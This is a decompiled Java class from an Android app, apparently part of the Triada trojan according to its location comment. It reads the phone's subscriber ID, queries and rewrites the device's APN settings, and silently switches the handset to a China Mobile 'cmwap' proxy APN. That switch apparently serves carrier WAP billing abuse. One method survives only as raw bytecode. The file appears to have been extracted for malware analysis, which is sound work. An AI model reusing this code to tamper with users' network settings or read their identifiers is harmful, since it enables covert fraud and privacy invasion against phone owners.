package com.android.essdk.eyou.f;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.telephony.TelephonyManager;
import com.android.essdk.eyou.e.b;
import com.android.essdk.eyou.e.i;
import com.android.essdk.eyou.e.m;

public class a {
  public static String a = "cmwap";
  
  public static String b = "cmnet";
  
  public static String c = "3gwap";
  
  public static String d = "3gnet";
  
  public static String e = "uniwap";
  
  public static String f = "uninet";
  
  private Context g;
  
  private Uri h;
  
  private Uri i;
  
  private int j;
  
  private int k;
  
  private TelephonyManager l;
  
  private int m;
  
  private int n;
  
  public a(Context paramContext) {
    this.g = paramContext;
    this.h = Uri.parse("content://telephony/carriers/preferapn");
    this.i = Uri.parse("content://telephony/carriers");
  }
  
  public int a(Context paramContext) {
    return i.e(paramContext).equals("mobile") ? c() : 0;
  }
  
  public boolean a() {
    try {
      Cursor cursor = this.g.getContentResolver().query(this.h, null, null, null, null);
      if (cursor != null && cursor.moveToFirst()) {
        String str1 = cursor.getString(cursor.getColumnIndex("proxy"));
        String str2 = cursor.getString(cursor.getColumnIndex("apn"));
        String str3 = cursor.getString(cursor.getColumnIndex("port"));
        String str4 = cursor.getString(cursor.getColumnIndex("current"));
        this.m = cursor.getInt(cursor.getColumnIndex("_id"));
        StringBuilder stringBuilder = new StringBuilder();
        this("proxy=");
        b.f("isCurrentWapAPN", stringBuilder.append(str1).append(" , apn=").append(str2).append(" port=").append(str3).append(" , current=").append(str4).append(" , _id=").append(this.m).toString());
        if (str1 == null || str2 == null || str3 == null || str4 == null)
          return false; 
        if ((str1.equals("10.0.0.172") || str1.equals("010.000.000.172") || str1.equals("10.0.0.200") || str1.equals("010.000.000.200")) && str3.equals("80") && str4.equals("1")) {
          b.f("isCurrentWapAPN", "CurrentWapAPNd is cmwap");
          return true;
        } 
      } 
    } catch (Exception exception) {
      b.b("NetManager", "读取APN失败");
    } 
    return false;
  }
  
  public boolean a(int paramInt) {
    boolean bool;
    ContentValues contentValues = new ContentValues();
    contentValues.put("apn_id", Integer.valueOf(paramInt));
    b.f("", "切换APN " + paramInt);
    try {
      this.g.getContentResolver().update(this.h, contentValues, null, null);
      this.m = paramInt;
      bool = true;
    } catch (Exception exception) {
      b.f("===", "切换APN失败");
      bool = false;
    } 
    return bool;
  }
  
  public boolean b() {
    try {
      Cursor cursor = this.g.getContentResolver().query(this.i, null, null, null, "_id ASC");
      while (true) {
        if (cursor != null && cursor.moveToNext()) {
          int i = cursor.getInt(cursor.getColumnIndex("_id"));
          String str1 = cursor.getString(cursor.getColumnIndex("name"));
          String str2 = cursor.getString(cursor.getColumnIndex("port"));
          String str3 = cursor.getString(cursor.getColumnIndex("proxy"));
          String str4 = cursor.getString(cursor.getColumnIndex("current"));
          String str5 = cursor.getString(cursor.getColumnIndex("apn"));
          if (str1 != null && str3 != null && str2 != null && str4 != null && str5 != null && (str3.equals("10.0.0.172") || str3.equals("010.000.000.172") || str3.equals("10.0.0.200") || str3.equals("010.000.000.200")) && str2.equals("80") && str4.equals("1")) {
            this.k = i;
            StringBuilder stringBuilder = new StringBuilder();
            this("cmwapApnId=");
            b.f("checkHasWapAPN", stringBuilder.append(this.k).toString());
            return true;
          } 
          continue;
        } 
        return false;
      } 
    } catch (Exception exception) {
      b.b("NetManager", "读取APN失败" + exception.getMessage());
    } 
    return false;
  }
  
  public boolean b(Context paramContext) {
    ConnectivityManager connectivityManager = (ConnectivityManager)paramContext.getSystemService("connectivity");
    NetworkInfo networkInfo = connectivityManager.getNetworkInfo(1);
    connectivityManager.getNetworkInfo(0);
    return networkInfo.isAvailable();
  }
  
  public int c() {
    // Byte code:
    //   0: aload_0
    //   1: getfield g : Landroid/content/Context;
    //   4: invokevirtual getContentResolver : ()Landroid/content/ContentResolver;
    //   7: astore_1
    //   8: new android/content/ContentValues
    //   11: dup
    //   12: invokespecial <init> : ()V
    //   15: astore_2
    //   16: aload_2
    //   17: ldc 'name'
    //   19: ldc 'cmwap'
    //   21: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   24: aload_2
    //   25: ldc 'apn'
    //   27: ldc 'cmwap'
    //   29: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   32: aload_2
    //   33: ldc 'proxy'
    //   35: ldc '10.0.0.172'
    //   37: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   40: aload_2
    //   41: ldc 'port'
    //   43: ldc '80'
    //   45: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   48: aload_0
    //   49: aload_0
    //   50: getfield g : Landroid/content/Context;
    //   53: ldc 'phone'
    //   55: invokevirtual getSystemService : (Ljava/lang/String;)Ljava/lang/Object;
    //   58: checkcast android/telephony/TelephonyManager
    //   61: putfield l : Landroid/telephony/TelephonyManager;
    //   64: aload_0
    //   65: getfield l : Landroid/telephony/TelephonyManager;
    //   68: invokevirtual getSubscriberId : ()Ljava/lang/String;
    //   71: astore_3
    //   72: aload_3
    //   73: ifnull -> 128
    //   76: aload_3
    //   77: invokevirtual trim : ()Ljava/lang/String;
    //   80: ldc ''
    //   82: invokevirtual equals : (Ljava/lang/Object;)Z
    //   85: ifne -> 128
    //   88: aload_3
    //   89: ldc_w '46000'
    //   92: invokevirtual startsWith : (Ljava/lang/String;)Z
    //   95: ifeq -> 261
    //   98: aload_2
    //   99: ldc_w 'numeric'
    //   102: ldc_w '46000'
    //   105: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   108: aload_2
    //   109: ldc_w 'mcc'
    //   112: ldc_w '460'
    //   115: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   118: aload_2
    //   119: ldc_w 'mnc'
    //   122: ldc_w '00'
    //   125: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   128: aload_2
    //   129: ldc_w 'mmsc'
    //   132: ldc_w 'http://mmsc.monternet.com'
    //   135: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   138: aload_2
    //   139: ldc_w 'mmsproxy'
    //   142: ldc '10.0.0.172'
    //   144: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   147: aload_2
    //   148: ldc_w 'mmsport'
    //   151: ldc '80'
    //   153: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   156: aload_1
    //   157: aload_0
    //   158: getfield i : Landroid/net/Uri;
    //   161: aload_2
    //   162: invokevirtual insert : (Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;
    //   165: astore_2
    //   166: aload_2
    //   167: ifnull -> 423
    //   170: aload_1
    //   171: aload_2
    //   172: aconst_null
    //   173: aconst_null
    //   174: aconst_null
    //   175: aconst_null
    //   176: invokevirtual query : (Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   179: astore_1
    //   180: aload_1
    //   181: astore_2
    //   182: aload_1
    //   183: ifnull -> 425
    //   186: aload_1
    //   187: astore_2
    //   188: aload_1
    //   189: invokeinterface moveToFirst : ()Z
    //   194: ifeq -> 425
    //   197: aload_1
    //   198: aload_1
    //   199: ldc '_id'
    //   201: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   206: invokeinterface getInt : (I)I
    //   211: istore #4
    //   213: aload_0
    //   214: iload #4
    //   216: putfield j : I
    //   219: aload_0
    //   220: iload #4
    //   222: invokevirtual a : (I)Z
    //   225: ifeq -> 383
    //   228: aload_0
    //   229: iload #4
    //   231: putfield k : I
    //   234: aload_1
    //   235: invokeinterface close : ()V
    //   240: iload #4
    //   242: istore #5
    //   244: aload_1
    //   245: ifnull -> 258
    //   248: aload_1
    //   249: invokeinterface close : ()V
    //   254: iload #4
    //   256: istore #5
    //   258: iload #5
    //   260: ireturn
    //   261: aload_3
    //   262: ldc_w '46002'
    //   265: invokevirtual startsWith : (Ljava/lang/String;)Z
    //   268: ifeq -> 304
    //   271: aload_2
    //   272: ldc_w 'numeric'
    //   275: ldc_w '46002'
    //   278: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   281: aload_2
    //   282: ldc_w 'mcc'
    //   285: ldc_w '460'
    //   288: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   291: aload_2
    //   292: ldc_w 'mnc'
    //   295: ldc_w '02'
    //   298: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   301: goto -> 128
    //   304: aload_3
    //   305: ldc_w '46007'
    //   308: invokevirtual startsWith : (Ljava/lang/String;)Z
    //   311: ifeq -> 347
    //   314: aload_2
    //   315: ldc_w 'numeric'
    //   318: ldc_w '46007'
    //   321: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   324: aload_2
    //   325: ldc_w 'mcc'
    //   328: ldc_w '460'
    //   331: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   334: aload_2
    //   335: ldc_w 'mnc'
    //   338: ldc_w '07'
    //   341: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   344: goto -> 128
    //   347: aload_2
    //   348: ldc_w 'numeric'
    //   351: aload_3
    //   352: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   355: aload_2
    //   356: ldc_w 'mcc'
    //   359: aload_3
    //   360: iconst_0
    //   361: iconst_3
    //   362: invokevirtual substring : (II)Ljava/lang/String;
    //   365: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   368: aload_2
    //   369: ldc_w 'mnc'
    //   372: aload_3
    //   373: iconst_3
    //   374: invokevirtual substring : (I)Ljava/lang/String;
    //   377: invokevirtual put : (Ljava/lang/String;Ljava/lang/String;)V
    //   380: goto -> 128
    //   383: iconst_0
    //   384: istore #4
    //   386: goto -> 234
    //   389: astore_1
    //   390: aconst_null
    //   391: astore_1
    //   392: aload_1
    //   393: ifnull -> 402
    //   396: aload_1
    //   397: invokeinterface close : ()V
    //   402: iconst_0
    //   403: istore #5
    //   405: goto -> 258
    //   408: astore_2
    //   409: aconst_null
    //   410: astore_1
    //   411: aload_1
    //   412: ifnull -> 421
    //   415: aload_1
    //   416: invokeinterface close : ()V
    //   421: aload_2
    //   422: athrow
    //   423: aconst_null
    //   424: astore_2
    //   425: aload_2
    //   426: ifnull -> 402
    //   429: aload_2
    //   430: invokeinterface close : ()V
    //   435: goto -> 402
    //   438: astore_2
    //   439: goto -> 411
    //   442: astore_2
    //   443: goto -> 392
    // Exception table:
    //   from	to	target	type
    //   156	166	389	java/lang/Exception
    //   156	166	408	finally
    //   170	180	389	java/lang/Exception
    //   170	180	408	finally
    //   188	234	442	java/lang/Exception
    //   188	234	438	finally
    //   234	240	442	java/lang/Exception
    //   234	240	438	finally
  }
  
  public int d() {
    return this.k;
  }
  
  public int e() {
    return this.m;
  }
  
  public boolean f() {
    boolean bool = true;
    m m = new m(this.g);
    if (m.b())
      m.c(); 
    if (a()) {
      b.f("SetCMWAPActivity", "current is CMWAP!");
      return bool;
    } 
    this.n = e();
    if (b()) {
      int i = d();
      b.f("SetCMWAPActivity", "checkHasWapAPN is true , cmwapid is " + i);
      if (!a(i))
        bool = false; 
      return bool;
    } 
    if (a(this.g) == 0)
      bool = false; 
    return bool;
  }
  
  public boolean g() {
    return (((TelephonyManager)this.g.getSystemService("phone")).getDataState() == 2);
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/f/a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */